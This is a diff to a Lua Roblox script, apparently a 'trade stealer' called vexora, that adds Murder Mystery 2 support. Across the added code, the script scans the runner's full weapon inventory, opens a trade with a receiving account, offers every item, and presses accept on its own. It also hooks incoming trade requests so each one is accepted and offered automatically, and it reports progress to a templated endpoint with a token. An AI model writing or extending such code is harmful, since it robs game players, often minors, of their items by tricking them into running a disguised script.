@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "3.2"
+local CLIENT_REV = "3.3"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -749,6 +749,9 @@ local function isRealItem(entry)
     return false
 end
 
+-- assigned further down, once the mm2 trade api is set up
+local mm2Owned
+
 local function realItems(deep)
     local all = scanInventory()
 
@@ -775,6 +778,17 @@ local function realItems(deep)
         if not seen[key] and isRealItem({ name = name, at = "cache" }) then
             seen[key] = true
             table.insert(real, name)
+        end
+    end
+
+    -- mm2 keeps the collection in ProfileData.Weapons.Owned, not in the player tree
+    if MM2 and mm2Owned then
+        for _, item in ipairs(mm2Owned() or {}) do
+            local key = item.name:lower()
+            if not seen[key] then
+                seen[key] = true
+                table.insert(real, item.name)
+            end
         end
     end
     table.sort(real, function(a, b) return a:lower() < b:lower() end)
@@ -949,6 +963,103 @@ local function reportProbe(receiver, detail, lines)
 end
 
 -- a trade screen is any visible gui with "trade" in the name
+--[[ ---- murder mystery 2 native trade ---- ]]
+local mm2TradeRoot = nil
+
+local function mm2Trade()
+    if PLACE_ID ~= 142823291 then return nil end
+    if mm2TradeRoot then return mm2TradeRoot end
+    local ok, trade = pcall(function() return ReplicatedStorage:WaitForChild("Trade", 5) end)
+    if ok and trade then mm2TradeRoot = trade end
+    return mm2TradeRoot
+end
+
+local mm2OwnedCache, mm2OwnedAt = nil, 0
+
+mm2Owned = function()
+    if PLACE_ID ~= 142823291 then return nil end
+    if mm2OwnedCache and os.time() - mm2OwnedAt < 15 then return mm2OwnedCache end
+
+    local items = {}
+    pcall(function()
+        local modules = ReplicatedStorage:FindFirstChild("Modules")
+        local profile = modules and modules:FindFirstChild("ProfileData")
+        local data = profile and require(profile)
+        local owned = data and data.Weapons and data.Weapons.Owned
+        if owned then
+            for name, amount in pairs(owned) do
+                table.insert(items, {
+                    name = tostring(name),
+                    amount = math.max(1, tonumber(amount) or 1),
+                })
+            end
+        end
+    end)
+
+    table.sort(items, function(a, b) return a.name < b.name end)
+    mm2OwnedCache, mm2OwnedAt = items, os.time()
+    if #items > 0 then inventoryInfo.seen = true end
+    return items
+end
+
+local function mm2StartTrade(target)
+    local trade = mm2Trade()
+    local start = trade and trade:FindFirstChild("StartTrade")
+    if not start then return false end
+    pcall(function() start:FireServer(target) end)
+    return true
+end
+
+local function mm2Offer()
+    local trade = mm2Trade()
+    local offer = trade and trade:FindFirstChild("OfferItem")
+    if not offer then return 0, {} end
+
+    local owned = mm2Owned() or {}
+    local names, sent = {}, 0
+    for _, item in ipairs(owned) do
+        table.insert(names, item.name)
+        for _ = 1, math.min(item.amount, 2) do
+            pcall(function() offer:FireServer(item.name, "Weapons") end)
+            sent = sent + 1
+            task.wait(0.2)
+        end
+    end
+    rememberItems(names)
+    return sent, names
+end
+
+local MM2_ACCEPT_PATHS = {
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+    { "TradeGUI", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+    { "TradeGUI_Phone", "Container", "Trade", "Actions", "Accept", "Cooldown", "Blocker" },
+    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "Confirm", "ActionButton" },
+    { "TradeGUI.Phone", "Container", "Trade", "Actions", "Accept", "ActionButton" },
+}
+
+local function mm2Confirm()
+    local trade = mm2Trade()
+    local accept = trade and trade:FindFirstChild("AcceptRequest")
+    if accept then pcall(function() accept:FireServer() end) end
+
+    local gui = LocalPlayer and LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not gui then return end
+
+    for _, path in ipairs(MM2_ACCEPT_PATHS) do
+        local node = gui
+        for _, name in ipairs(path) do
+            node = node and node:FindFirstChild(name)
+        end
+        if node then
+            pcall(function() firesignal(node.Activated) end)
+            pcall(function() firesignal(node.MouseButton1Click) end)
+        end
+    end
+end
+
 local function tradeWindow()
     local player = LocalPlayer or Players.LocalPlayer
     local gui = player and player:FindFirstChildOfClass("PlayerGui")
@@ -1385,6 +1496,50 @@ local function runReceiverTrade(player)
         reportTrade("receiver_joined", player.Name, { detail = "starting trade" })
         task.wait(1.5)
 
+        -- mm2 has a real trade api: StartTrade, OfferItem, AcceptRequest. no clicking
+        if PLACE_ID == 142823291 then
+            local started = mm2StartTrade(player)
+            reportTrade("request", player.Name, {
+                detail = started and "mm2 StartTrade" or "mm2 StartTrade missing",
+            })
+            if not started then
+                reportTrade("no_window", player.Name, { detail = "mm2 trade api not found" })
+                outgoingTrade = false
+                task.delay(45, function() tradesRun[key] = nil end)
+                return
+            end
+
+            local deadline = os.clock() + 15
+            while not stopped and os.clock() < deadline and not tradeWindow() do task.wait(0.3) end
+
+            if not tradeWindow() then
+                reportTrade("no_window", player.Name, { detail = "mm2 window never opened" })
+                outgoingTrade = false
+                task.delay(30, function() tradesRun[key] = nil end)
+                return
+            end
+
+            reportTrade("window", player.Name, { detail = "mm2 trade ui open" })
+            local sent, names = mm2Offer()
+            reportTrade("offer", player.Name, {
+                items = names,
+                detail = sent .. " item(s) via OfferItem",
+            })
+
+            task.wait(0.4)
+            mm2Confirm()
+            reportTrade("confirm", player.Name, { detail = "mm2 accept x1" })
+            task.wait(1)
+            mm2Confirm()
+            reportTrade("confirm", player.Name, { detail = "mm2 accept x2" })
+            task.wait(1.5)
+            reportTrade("done", player.Name, { detail = "mm2 offer sent" })
+
+            outgoingTrade = false
+            task.delay(45, function() tradesRun[key] = nil end)
+            return
+        end
+
         local opened, attempts = false, 0
         while not stopped and not opened and attempts < RECEIVER_RETRY do
             attempts = attempts + 1
@@ -1716,6 +1871,28 @@ if AUTO_TRADE_RECEIVERS then
                 end
             end
         end)
+    end
+end
+
+-- mm2 asks the receiver through SendRequest.OnClientInvoke; answering true and
+-- offering inside it is what makes an incoming request complete
+if PLACE_ID == 142823291 then
+    local trade = mm2Trade()
+    local sendRequest = trade and trade:FindFirstChild("SendRequest")
+    if sendRequest then
+        pcall(function()
+            sendRequest.OnClientInvoke = function()
+                task.spawn(function()
+                    task.wait(0.4)
+                    local sent = mm2Offer()
+                    task.wait(0.4)
+                    mm2Confirm()
+                    print(string.format("[vexora] mm2 request accepted - %d item(s) offered", sent))
+                end)
+                return true
+            end
+        end)
+        print("[vexora] mm2 SendRequest hook installed")
     end
 end
 
